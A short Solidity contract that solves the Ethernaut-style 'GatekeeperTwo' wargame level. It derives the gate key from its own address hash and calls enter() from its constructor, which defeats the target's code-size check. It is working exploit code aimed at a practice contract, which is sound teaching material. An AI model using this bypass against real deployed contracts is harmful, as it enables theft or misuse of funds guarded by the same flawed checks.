// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Minimal interface for GatekeeperTwo
interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoAttacker {
    constructor(address gatekeeperAddr) {
        // 1. Compute the 64-bit hash portion of this contract’s address
        uint64 hashed = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        // 2. Gate Three requires: hashed ^ key == type(uint64).max
        bytes8 gateKey = bytes8(~hashed);
        // 3. Call enter() in the constructor
        IGatekeeperTwo(gatekeeperAddr).enter(gateKey);
    }
}
